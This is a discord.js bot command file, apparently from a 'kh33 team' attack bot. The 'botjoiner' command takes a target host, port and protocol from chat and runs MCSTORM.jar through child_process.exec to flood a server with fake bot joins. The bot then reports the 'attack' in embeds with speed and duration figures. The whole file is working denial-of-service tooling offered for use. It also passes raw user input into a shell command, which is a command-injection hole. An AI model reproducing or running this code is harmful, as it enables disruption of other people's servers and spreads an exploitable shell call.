const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Commands')
	.setDescription("`Attack command $botjoiner <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`$botjoiner <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
        .setDescription("Please Send valid Commnds !")
	message.channel.send(embed1);
	return;
	}
	
  
var exec = require('child_process').exec
exec(`java -jar MCSTORM.jar ${host}:${port} ${protocol} botjoiner 150 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('send attack botjoiner by id :' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle(' **kh33 team Bots V1.0** ⚡')
	.setTimestamp()
	.setDescription("**► The attack has stopped 🛑**")
	.setFooter('© dev kh33 team.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 message.react('✅');
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/PevawhFpudkKJnh2Wb/giphy.gif", "https://media.giphy.com/media/PevawhFpudkKJnh2Wb/giphy.gif", "https://media.giphy.com/media/PevawhFpudkKJnh2Wb/giphy.gif" , "https://media.giphy.com/media/PevawhFpudkKJnh2Wb/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle(' **kh33 team Bots v1.0 ** ⚡')
	.setTimestamp()	.setDescription("**User** : `" + message.author.username + "` \n **Host** : `" + host + "` \n **Port** : `" + port + "` \n **Protocol** : `" + protocol + "`\n \n **🌐 Methods** : `BotJoiner` \n **! CPS ** : `500-9k` \n **⌛ Seconds** : `150`")
	.setFooter('© dev kh33 team.', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
 message.react('✅');
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['botjoiner'],
  permLevel: 0
}

exports.help = {
  name: 'botjoiner',
  description: 'Özel',
  usage: 'botjoiner'
}